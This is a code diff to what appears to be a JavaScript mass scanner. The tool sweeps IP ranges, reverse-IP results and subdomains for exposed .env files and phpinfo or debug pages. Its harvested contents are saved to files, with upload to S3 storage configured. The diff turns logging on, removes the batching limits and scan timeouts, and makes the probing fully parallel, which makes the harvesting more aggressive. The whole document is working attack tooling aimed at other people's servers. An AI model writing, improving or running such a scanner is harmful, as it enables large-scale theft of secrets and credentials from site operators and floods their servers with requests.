@@ -27,7 +27,7 @@ try {
 var patterns = packCfg.APP_REGEX_ENV_SHELL || [];
 var file_envscan = [...new Set(packCfg.file_env_shellscan || [])];
 var file_phpprofile = [...new Set(packCfg.file_phpprofile_shellscan || [])];
-var LOG_ACTIVE = false;
+var LOG_ACTIVE = true;
 var LOG_UPLOAD_INTERVAL = 500 + Math.floor(Math.random() * 300);
 var AWS_S3 = true;
 var BUNNY_STORAGE = false;
@@ -41,7 +41,6 @@ var BUNNY_API_KEY = "";
 var LOAD_FROM_SITE = false;
 var LOAD_FROM_CIDR = true;
 var USE_REV = false;
-var MAX_SITE_BATCH = 5;
 var MAX_LIST_ENV = 20;
 var MAX_LIST_PHP = 20;
 var DNS_WORKERS_EC2 = 100;
@@ -51,8 +50,6 @@ var NUM_CIDR_PER_CYCLE = 6;
 var TOTAL_SLOTS = 2e3;
 var NUM_WORKERS = 5;
 var POOL_REFRESH_CYCLES = 10;
-var SCAN_TIMEOUT_MS = 6e4;
-var MAX_URLS_PER_WORKER = 100;
 var s3Client = new S3Client({
   region: S3_REGION,
   credentials: { accessKeyId: S3_ACCESS_KEY, secretAccessKey: S3_SECRET_KEY },
@@ -409,13 +406,17 @@ async function scanSite(siteLink, isFallback = false) {
     log(`  [LOOK] Starting scan ${siteLink}`);
     let checked = 0;
     let checkeds = 0;
+    let totalEnvAttempted = 0;
+    let totalPhpAttempted = 0;
     let wildcardStrikeCount = 0;
     let fakeForSite = false;
     let foundForSite = false;
+    let matchesFound = 0;
     const seenContentHashes = /* @__PURE__ */ new Set();
     const envBatches = [...generateEnvBatches(siteLink)];
     for (const batch of envBatches) {
       if (fakeForSite || foundForSite) break;
+      totalEnvAttempted += batch.length;
       const results = await asyncPool(
         MAX_LIST_ENV,
         batch,
@@ -456,6 +457,7 @@ async function scanSite(siteLink, isFallback = false) {
           }
         }
         if (foundForSite) {
+          matchesFound++;
           log(`  [+] Found | ${res.config.url}`);
           const suffix = randStr(20);
           const savedPath = path.join(NEW_PATH_EXTRACT, `ENV_NEW_${suffix}.txt`);
@@ -474,17 +476,18 @@ ${content}`);
       }
     }
     if (fakeForSite) {
-      log(`  [OK] STOP NOPE ${siteLink} \u2014 ${checked} links (DUPE/flood)`);
+      log(`  [OK] STOP NOPE ${siteLink} \u2014 scanned ${totalEnvAttempted} urls, checked ${checked} (DUPE/flood)`);
       return;
     }
     if (foundForSite) {
-      log(`  [OK] STOP FOUND ${siteLink} \u2014 ${checked} links`);
+      log(`  [OK] STOP FOUND ${siteLink} \u2014 scanned ${totalEnvAttempted} urls, checked ${checked}, matches ${matchesFound}`);
       await doReverseAndSubdomains(siteLink, isFallback);
       return;
     }
     const phpBatches = [...generatePhpBatches(siteLink)];
     for (const batch of phpBatches) {
       if (fakeForSite || foundForSite) break;
+      totalPhpAttempted += batch.length;
       const results = await asyncPool(
         MAX_LIST_PHP,
         batch,
@@ -563,6 +566,7 @@ ${content}`);
             }
           }
           if (foundForSite) {
+            matchesFound++;
             log(`  [+] Found | ${item.url}`);
             if (item.isDebugPage || contentsx.toLowerCase().includes("phpinfo")) {
               try {
@@ -606,13 +610,14 @@ ${formattedOutput}`);
       if (fakeForSite || foundForSite) break;
     }
     const totalTested = checked + checkeds;
+    const totalScanned = totalEnvAttempted + totalPhpAttempted;
     if (fakeForSite) {
-      log(`  [OK] STOP NOPE ${siteLink} \u2014 ${totalTested} links (DUPE)`);
+      log(`  [OK] STOP NOPE ${siteLink} \u2014 scanned ${totalScanned} urls, checked ${totalTested} (DUPE/flood)`);
     } else if (foundForSite) {
-      log(`  [OK] STOP FOUND ${siteLink} \u2014 ${totalTested} links`);
+      log(`  [OK] STOP FOUND ${siteLink} \u2014 scanned ${totalScanned} urls, checked ${totalTested}, matches ${matchesFound}`);
       await doReverseAndSubdomains(siteLink, isFallback);
     } else {
-      log(`  [OK] STOP NONE ${siteLink} \u2014 ${totalTested} links`);
+      log(`  [OK] STOP NONE ${siteLink} \u2014 scanned ${totalScanned} urls, checked ${totalTested}`);
     }
   } catch (e) {
     try {
@@ -621,23 +626,26 @@ ${formattedOutput}`);
     }
   }
 }
-var CHK_CONCURRENCY = 20;
 async function processUrls(urlsList, isFallback = false) {
   log(`
 [CHK] Starting scan on ${urlsList.length} URLs (fallback=${isFallback})`);
-  for (let i = 0; i < urlsList.length; i += 100) {
-    const chunk = urlsList.slice(i, i + 100);
-    log(`[CHK] Checking block of ${chunk.length} URLs...`);
+  for (let i = 0; i < urlsList.length; i += 200) {
+    const chunk = urlsList.slice(i, i + 200);
     const probes = chunk.map((url) => ({ orig: url, probe: getInitialUrl(url) }));
-    const results = await asyncPool(
-      CHK_CONCURRENCY,
-      probes,
-      ({ probe }) => ax.get(probe, { timeout: 3e3, responseType: "stream" })
+    const probeUrls = probes.map((p) => p.probe);
+    log(`[CHK] Probing ${probeUrls.length} URLs in parallel...`);
+    const rawResults = await Promise.allSettled(
+      probeUrls.map((url) => ax.get(url, { timeout: 3e3, responseType: "stream" }))
     );
     const hostsBySite = {};
-    for (let j = 0; j < results.length; j++) {
-      const r = results[j];
-      if (r.status !== "fulfilled" || !r.value) continue;
+    const retryList = [];
+    for (let j = 0; j < rawResults.length; j++) {
+      const r = rawResults[j];
+      if (r.status !== "fulfilled" || !r.value) {
+        const retryU = getRetryUrl(probes[j].orig);
+        if (retryU) retryList.push({ retryUrl: retryU, idx: j });
+        continue;
+      }
       const res = r.value;
       try {
         res.data.destroy();
@@ -651,22 +659,15 @@ async function processUrls(urlsList, isFallback = false) {
             php: [...generatePhpBatches(siteUrl)]
           };
         }
-      }
-    }
-    const retryMap = [];
-    for (let j = 0; j < results.length; j++) {
-      const r = results[j];
-      if (r.status !== "fulfilled" || !r.value || ![200, 403, 206].includes(r.value.status)) {
+      } else {
         const retryU = getRetryUrl(probes[j].orig);
-        if (retryU) retryMap.push({ retryUrl: retryU, origUrl: probes[j].orig });
+        if (retryU) retryList.push({ retryUrl: retryU, idx: j });
       }
     }
-    if (retryMap.length > 0) {
-      log(`[CHK] Retrying ${retryMap.length} URLs in HTTPS...`);
-      const retryResults = await asyncPool(
-        CHK_CONCURRENCY,
-        retryMap,
-        ({ retryUrl }) => ax.get(retryUrl, { timeout: 3e3, responseType: "stream" })
+    if (retryList.length > 0) {
+      log(`[CHK] Retrying ${retryList.length} URLs in HTTPS...`);
+      const retryResults = await Promise.allSettled(
+        retryList.map((r) => ax.get(r.retryUrl, { timeout: 3e3, responseType: "stream" }))
       );
       for (let j = 0; j < retryResults.length; j++) {
         const r = retryResults[j];
@@ -677,7 +678,7 @@ async function processUrls(urlsList, isFallback = false) {
         } catch (_) {
         }
         if ([200, 403, 206].includes(res.status)) {
-          const siteUrl = retryMap[j].retryUrl;
+          const siteUrl = retryList[j].retryUrl;
           if (!hostsBySite[siteUrl]) {
             hostsBySite[siteUrl] = {
               env: [...generateEnvBatches(siteUrl)],
@@ -687,23 +688,17 @@ async function processUrls(urlsList, isFallback = false) {
         }
       }
     }
-    const siteList = Object.entries(hostsBySite);
-    for (let batchIdx = 0; batchIdx < siteList.length; batchIdx += MAX_SITE_BATCH) {
-      const chunkSites = siteList.slice(batchIdx, batchIdx + MAX_SITE_BATCH);
-      await Promise.all(chunkSites.map(
-        ([siteUrl, payloads]) => scanSite(siteUrl, isFallback)
+    const siteEntries = Object.entries(hostsBySite);
+    if (siteEntries.length > 0) {
+      log(`[CHK] Scanning ${siteEntries.length} live sites in parallel...`);
+      await Promise.all(siteEntries.map(
+        ([siteUrl]) => scanSite(siteUrl, isFallback)
       ));
-      const bn = Math.floor(batchIdx / MAX_SITE_BATCH) + 1;
-      const totalBatches = Math.ceil(siteList.length / MAX_SITE_BATCH);
-      log(`  [CHK] Batch ${bn}/${totalBatches} completed`);
+      log(`  [CHK] All ${siteEntries.length} sites scanned.`);
+    } else {
+      log(`  [CHK] No live sites found in this block.`);
     }
   }
-}
-async function processUrlsWithTimeout(urlsList, isFallback = false, timeoutMs = SCAN_TIMEOUT_MS) {
-  return Promise.race([
-    processUrls(urlsList, isFallback),
-    new Promise((_, reject) => setTimeout(() => reject(new Error(`TIMEOUT ${timeoutMs}ms`)), timeoutMs))
-  ]);
 }
 async function doReverseAndSubdomains(siteLink, isFallback) {
   if (!USE_REV || isFallback) return;
@@ -724,7 +719,7 @@ async function doReverseAndSubdomains(siteLink, isFallback) {
       if (filtered.length > 0) {
         log(`  [REV] IP ${hostxxx} \u2014 found ${filtered.length} domains`);
         for (const d of filtered) log(`    [REV] => ${d}`);
-        await processUrlsWithTimeout(filtered, true).catch((e) => log(`  [REV] Timeout/error scanning domains: ${e.message}`));
+        await processUrls(filtered, true).catch((e) => log(`  [REV] Error scanning domains: ${e.message}`));
       } else {
         log(`  [REV] IP ${hostxxx} \u2014 filtered (all self-referential)`);
       }
@@ -741,7 +736,7 @@ async function doReverseAndSubdomains(siteLink, isFallback) {
       if (domains.length > 0) {
         log(`  [REV] Domain ${targetDomain} \u2014 found ${domains.length} subdomains`);
         for (const d of domains) log(`    [REV] => ${d}`);
-        await processUrlsWithTimeout(domains, true).catch((e) => log(`  [REV] Timeout/error scanning subdomains: ${e.message}`));
+        await processUrls(domains, true).catch((e) => log(`  [REV] Error scanning subdomains: ${e.message}`));
       }
     } else {
       log(`  [REV] No subdomains, trying reverse IP for ${hostxxx}...`);
@@ -755,7 +750,7 @@ async function doReverseAndSubdomains(siteLink, isFallback) {
             if (revDomains.length > 0) {
               log(`  [REV] IP ${targetIp} \u2014 found ${revDomains.length} domains`);
               for (const d of revDomains) log(`    [REV] => ${d}`);
-              await processUrlsWithTimeout(revDomains, true).catch((e) => log(`  [REV] Timeout/error scanning revDomains: ${e.message}`));
+              await processUrls(revDomains, true).catch((e) => log(`  [REV] Error scanning revDomains: ${e.message}`));
             }
           }
         }
@@ -930,16 +925,9 @@ async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
     log(`[W${workerId}] No URLs found. Skipping scan.`);
     return;
   }
-  let chunkNum = 0;
-  for (let offset = 0; offset < urls.length; offset += MAX_URLS_PER_WORKER) {
-    chunkNum++;
-    const chunk = urls.slice(offset, offset + MAX_URLS_PER_WORKER);
-    const totalChunks = Math.ceil(urls.length / MAX_URLS_PER_WORKER);
-    log(`[W${workerId}] Phase 2 \u2014 Chunk ${chunkNum}/${totalChunks} \u2014 Scanning ${chunk.length} verified URLs...`);
-    await processUrlsWithTimeout(chunk).catch((e) => log(`[W${workerId}] Phase 2 chunk ${chunkNum} \u2014 Timeout/error: ${e.message}`));
-    log(`[W${workerId}] Phase 2 chunk ${chunkNum}/${totalChunks} completed.`);
-  }
-  log(`[W${workerId}] Phase 2 \u2014 ALL chunks completed (${urls.length} URLs total).`);
+  log(`[W${workerId}] Phase 2 \u2014 Scanning ${urls.length} verified URLs...`);
+  await processUrls(urls).catch((e) => log(`[W${workerId}] Phase 2 \u2014 Error: ${e.message}`));
+  log(`[W${workerId}] Phase 2 completed (${urls.length} URLs).`);
 }
 var cidrPoolShared = null;
 var scannedUrlsGlobal = /* @__PURE__ */ new Set();
@@ -978,7 +966,7 @@ async function workerLoop(workerId) {
         }
         const fname = path.basename(filepath);
         log(`[SITE] Worker ${workerId} \u2014 Scanning ${fname}: ${targets.length} targets`);
-        await processUrlsWithTimeout(targets).catch((e) => log(`[SITE] Timeout/error scanning ${fname}: ${e.message}`));
+        await processUrls(targets).catch((e) => log(`[SITE] Error scanning ${fname}: ${e.message}`));
         await deleteSiteFile(filepath);
         filesProcessed++;
       }
